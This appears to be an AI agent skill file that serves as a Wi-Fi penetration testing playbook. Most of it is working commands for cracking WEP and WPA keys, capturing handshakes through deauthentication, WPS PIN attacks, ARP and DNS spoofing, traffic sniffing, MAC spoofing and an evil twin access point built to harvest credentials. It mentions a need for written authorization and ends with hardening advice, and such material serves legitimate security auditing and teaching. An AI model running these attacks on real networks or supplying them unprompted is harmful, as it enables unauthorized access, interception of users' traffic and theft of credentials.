---
name: Wi-Fi Penetration Testing
description: This skill should be used when the user asks to "perform wireless network penetration testing", "crack WEP or WPA passwords", "capture Wi-Fi handshakes", "conduct deauthentication attacks", "test wireless security", "perform MITM attacks on Wi-Fi", or "assess wireless network vulnerabilities". It provides comprehensive techniques for auditing wireless network security.
version: 1.0.0
tags: [wifi, wireless, aircrack-ng, wpa, wep, penetration-testing, network-security]
---

# Wi-Fi Penetration Testing

## Purpose

Assess wireless network security by testing encryption strength, capturing authentication handshakes, and exploiting vulnerabilities in Wi-Fi implementations. This skill covers reconnaissance, pre-connection attacks, encryption cracking, and post-connection exploitation techniques for comprehensive wireless security auditing.

## Prerequisites

### Required Hardware
- Wireless adapter supporting monitor mode and packet injection
- Recommended chipsets: Atheros AR9271, Realtek RTL8812AU, Alfa AWUS036ACH
- Computer running Kali Linux or similar penetration testing OS

### Required Tools
```bash
# Core wireless tools
sudo apt-get install aircrack-ng wireshark reaver

# Additional tools
sudo apt-get install ettercap-graphical bettercap hostapd-wpe
```

### Required Knowledge
- Understanding of 802.11 wireless protocols
- Wi-Fi security protocols (WEP, WPA, WPA2, WPA3)
- Basic networking concepts
- Linux command-line proficiency

### Required Access
- Written authorization from network owner
- Physical proximity to target network
- Test environment for practice

## Outputs and Deliverables

1. **Wireless Security Assessment Report** - Document network vulnerabilities and encryption weaknesses
2. **Captured Handshakes** - WPA/WPA2 4-way handshake files for analysis
3. **Cracked Credentials** - Successfully recovered network passwords
4. **Remediation Recommendations** - Security hardening guidance

## Core Workflow

### Phase 1: Wireless Adapter Setup

Connect and verify wireless adapter capabilities:

```bash
# Check if adapter is recognized
lsusb
# Look for: "Realtek Semiconductor Corp." or "Atheros Communications"

# Verify wireless interface exists
ifconfig
iwconfig

# Install drivers if needed (Realtek example)
sudo apt-get update
sudo apt-get install realtek-rtl88xxau-dkms
```

### Phase 2: Enable Monitor Mode

Configure adapter for packet capture:

```bash
# Check current mode
iwconfig wlan0

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0

# Verify monitor mode (interface becomes wlan0mon)
iwconfig wlan0mon
# Should show: Mode: Monitor
```

### Phase 3: Network Discovery

Scan for available wireless networks:

```bash
# Scan all networks
sudo airodump-ng wlan0mon

# Output columns:
# BSSID     - Access point MAC address
# PWR       - Signal strength (higher = closer)
# Beacons   - Number of beacon frames
# #Data     - Number of data packets
# #/s       - Data packets per second
# CH        - Channel
# MB        - Maximum speed
# ENC       - Encryption (WEP, WPA, WPA2, OPN)
# CIPHER    - Cipher (CCMP, TKIP, WEP)
# AUTH      - Authentication (PSK, MGT, SKA, OPN)
# ESSID     - Network name

# Filter by specific channel
sudo airodump-ng -c 6 wlan0mon

# Filter by BSSID
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF wlan0mon
```

### Phase 4: Target Specific Network

Focus capture on target network:

```bash
# Capture packets from specific network
sudo airodump-ng --bssid [TARGET_BSSID] -c [CHANNEL] -w capture wlan0mon

# Example:
sudo airodump-ng --bssid 00:11:22:33:44:55 -c 6 -w capture wlan0mon

# This creates:
# capture-01.cap    - Packet capture file
# capture-01.csv    - CSV with network info
# capture-01.kismet.csv - Kismet format
```

### Phase 5: WEP Cracking

Crack outdated WEP encryption:

```bash
# Step 1: Start capture on target
sudo airodump-ng --bssid [BSSID] -c [CH] -w wep_capture wlan0mon

# Step 2: Fake authentication (if needed)
sudo aireplay-ng -1 0 -e [SSID] -a [BSSID] -h [YOUR_MAC] wlan0mon

# Step 3: ARP replay attack (generate traffic)
sudo aireplay-ng -3 -b [BSSID] -h [YOUR_MAC] wlan0mon

# Step 4: Wait for sufficient IVs (typically 20,000+)
# Monitor #Data column in airodump-ng

# Step 5: Crack the key
sudo aircrack-ng wep_capture-01.cap

# Output: KEY FOUND! [ XX:XX:XX:XX:XX ]
```

### Phase 6: WPA/WPA2 Handshake Capture

Capture 4-way handshake for offline cracking:

```bash
# Step 1: Monitor target network
sudo airodump-ng --bssid [BSSID] -c [CH] -w wpa_capture wlan0mon

# Step 2: Wait for client connection OR force deauthentication
# Deauth attack (forces reconnection)
sudo aireplay-ng --deauth 10 -a [BSSID] wlan0mon

# Deauth specific client
sudo aireplay-ng --deauth 10 -a [BSSID] -c [CLIENT_MAC] wlan0mon

# Step 3: Watch for "WPA handshake: [BSSID]" in airodump-ng

# Step 4: Verify handshake capture
sudo aircrack-ng wpa_capture-01.cap
# Should show: "1 handshake"
```

### Phase 7: WPA/WPA2 Password Cracking

Crack captured handshake with wordlist:

```bash
# Dictionary attack
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [BSSID] wpa_capture-01.cap

# Using custom wordlist
sudo aircrack-ng -w custom_wordlist.txt -b [BSSID] wpa_capture-01.cap

# Using hashcat (faster with GPU)
# Convert capture to hashcat format
sudo aircrack-ng -j hash wpa_capture-01.cap

# Run hashcat
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Brute force with hashcat (8-character passwords)
hashcat -m 22000 -a 3 hash.hc22000 ?a?a?a?a?a?a?a?a
```

### Phase 8: WPS Attack

Exploit Wi-Fi Protected Setup vulnerabilities:

```bash
# Scan for WPS-enabled networks
sudo wash -i wlan0mon

# Attack WPS PIN
sudo reaver -i wlan0mon -b [BSSID] -vv

# Faster Pixie-Dust attack
sudo reaver -i wlan0mon -b [BSSID] -vv -K 1

# Using bully (alternative tool)
sudo bully -b [BSSID] -c [CH] wlan0mon
```

### Phase 9: Post-Connection Attacks

After gaining network access:

**Man-in-the-Middle Attack:**
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoofing with ettercap
sudo ettercap -T -q -i wlan0 -M arp:remote /[VICTIM_IP]// /[ROUTER_IP]//

# Using arpspoof
sudo arpspoof -i wlan0 -t [VICTIM_IP] [ROUTER_IP]
sudo arpspoof -i wlan0 -t [ROUTER_IP] [VICTIM_IP]
```

**DNS Spoofing:**
```bash
# Create etter.dns file
echo "* A [YOUR_IP]" > /etc/ettercap/etter.dns

# Run ettercap with DNS spoofing
sudo ettercap -T -q -i wlan0 -M arp:remote -P dns_spoof /[VICTIM_IP]// /[ROUTER_IP]//
```

**Capture Credentials:**
```bash
# Capture HTTP traffic
sudo tcpdump -i wlan0 -w traffic.pcap

# Capture with specific filters
sudo tcpdump -i wlan0 port 80 or port 443 -w web_traffic.pcap

# Analyze with Wireshark
wireshark traffic.pcap
```

### Phase 10: MAC Address Spoofing

Evade MAC-based access controls:

```bash
# View current MAC
ifconfig wlan0 | grep ether

# Disable interface
sudo ifconfig wlan0 down

# Change MAC address
sudo ifconfig wlan0 hw ether 00:11:22:33:44:55

# Or use macchanger
sudo macchanger -r wlan0  # Random MAC
sudo macchanger -m 00:11:22:33:44:55 wlan0  # Specific MAC

# Enable interface
sudo ifconfig wlan0 up
```

## Quick Reference

### Essential Commands

| Action | Command |
|--------|---------|
| Enable monitor mode | `sudo airmon-ng start wlan0` |
| Disable monitor mode | `sudo airmon-ng stop wlan0mon` |
| Scan networks | `sudo airodump-ng wlan0mon` |
| Target network | `sudo airodump-ng --bssid [BSSID] -c [CH] -w capture wlan0mon` |
| Deauth attack | `sudo aireplay-ng --deauth 10 -a [BSSID] wlan0mon` |
| Crack WPA | `sudo aircrack-ng -w wordlist.txt capture.cap` |
| WPS attack | `sudo reaver -i wlan0mon -b [BSSID] -vv` |
| Kill processes | `sudo airmon-ng check kill` |

### Wi-Fi Security Protocols

| Protocol | Security Level | Cracking Difficulty |
|----------|---------------|---------------------|
| Open | None | N/A - No encryption |
| WEP | Very Weak | Easy - Minutes with traffic |
| WPA-TKIP | Weak | Medium - Dictionary attack |
| WPA2-PSK | Moderate | Hard - Strong password resistant |
| WPA2-Enterprise | Strong | Very Hard - Requires credentials |
| WPA3 | Strong | Very Hard - Dragonfly handshake |

### Common Wordlists

```bash
# Kali Linux wordlists
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/fasttrack.txt
/usr/share/wordlists/nmap.lst
/usr/share/john/password.lst

# Download SecLists
git clone https://github.com/danielmiessler/SecLists
# Wi-Fi specific: SecLists/Passwords/WiFi-WPA/
```

### Signal Strength Guide

| PWR Value | Quality | Recommended Action |
|-----------|---------|-------------------|
| -30 to -50 | Excellent | Ideal for testing |
| -50 to -60 | Good | Reliable capture |
| -60 to -70 | Fair | May miss packets |
| -70 to -80 | Weak | Move closer |
| Below -80 | Poor | Not viable |

## Constraints and Limitations

### Legal Constraints
- Only test networks you own or have written authorization to test
- Unauthorized wireless access is illegal in most jurisdictions
- Deauthentication attacks may violate FCC regulations
- Document all testing activities for legal protection

### Technical Limitations
- WPA3 uses Dragonfly handshake resistant to offline attacks
- Strong passwords (12+ random characters) are practically uncrackable
- Enterprise authentication requires different attack vectors
- Some adapters don't support 5GHz or certain channels

### Environmental Factors
- Signal strength affects capture quality
- Interference from other networks
- Physical obstacles reduce range
- Client activity needed for handshake capture

## Examples

### Example 1: Complete WPA2 Attack

**Scenario:** Audit home network security

```bash
# Step 1: Setup
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Step 2: Find target
sudo airodump-ng wlan0mon
# Note: BSSID=00:11:22:33:44:55, CH=6, ESSID=HomeNetwork

# Step 3: Capture handshake
sudo airodump-ng --bssid 00:11:22:33:44:55 -c 6 -w home_capture wlan0mon

# Step 4: Deauth client (new terminal)
sudo aireplay-ng --deauth 5 -a 00:11:22:33:44:55 wlan0mon

# Step 5: Wait for "WPA handshake" message

# Step 6: Crack password
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt home_capture-01.cap

# Result: KEY FOUND! [ password123 ]
```

### Example 2: Evil Twin Attack

**Scenario:** Create rogue access point for credential capture

```bash
# Step 1: Get target network details
sudo airodump-ng wlan0mon
# Target: "CoffeeShop_WiFi" on channel 1

# Step 2: Create hostapd config
cat > /tmp/hostapd.conf << EOF
interface=wlan1
driver=nl80211
ssid=CoffeeShop_WiFi
channel=1
EOF

# Step 3: Start rogue AP
sudo hostapd /tmp/hostapd.conf

# Step 4: Setup DHCP and DNS
sudo dnsmasq -C /tmp/dnsmasq.conf

# Step 5: Capture credentials with captive portal
```

### Example 3: Hidden Network Discovery

**Scenario:** Discover and connect to hidden SSID

```bash
# Hidden networks show <length: X> in ESSID column
sudo airodump-ng wlan0mon

# Force client deauth to reveal SSID in probe request
sudo aireplay-ng --deauth 5 -a [BSSID] wlan0mon

# ESSID will appear when client reconnects
# Or use mdk3 for probe request flood
sudo mdk3 wlan0mon p -t [BSSID]
```

## Troubleshooting

### Monitor Mode Not Working

**Problem:** `airmon-ng start wlan0` fails or no monitor interface created

**Solutions:**
1. Install correct drivers for your adapter chipset
2. Check if adapter supports monitor mode: `iw list | grep monitor`
3. Kill interfering processes: `sudo airmon-ng check kill`
4. Try manual method:
   ```bash
   sudo ifconfig wlan0 down
   sudo iwconfig wlan0 mode monitor
   sudo ifconfig wlan0 up
   ```
5. Update kernel and drivers

### No Handshake Captured

**Problem:** Deauth attacks not producing handshake

**Solutions:**
1. Ensure client is actively connected to target network
2. Increase deauth packet count: `--deauth 50`
3. Target specific client instead of broadcast
4. Move closer to access point for better signal
5. Verify you're on the correct channel
6. Check if AP has client isolation enabled

### Aircrack-ng Not Finding Password

**Problem:** Wordlist exhausted without finding password

**Solutions:**
1. Verify handshake is complete: `aircrack-ng capture.cap`
2. Use larger wordlists or create custom targeted list
3. Try hashcat with GPU acceleration
4. Use rule-based attacks to mutate wordlist
5. Consider that password may be truly strong/random

### Injection Not Working

**Problem:** Deauth packets not affecting clients

**Solutions:**
1. Verify injection support: `aireplay-ng -9 wlan0mon`
2. Use correct driver for your adapter
3. Check if target uses 802.11w (Management Frame Protection)
4. Ensure you're close enough to target
5. Try different deauth techniques

## Security Recommendations

### For Network Administrators

1. **Use WPA3** when devices support it
2. **Strong Passwords** - Minimum 12 random characters
3. **Disable WPS** - Known vulnerability vector
4. **MAC Filtering** - Defense in depth (not sole protection)
5. **Hidden SSID** - Minor obfuscation (not security)
6. **Regular Audits** - Test your own networks periodically
7. **Guest Networks** - Isolate untrusted devices
8. **Update Firmware** - Patch known vulnerabilities
9. **Enterprise Auth** - Use RADIUS for business networks
10. **Monitor Logs** - Detect deauth and rogue AP attacks
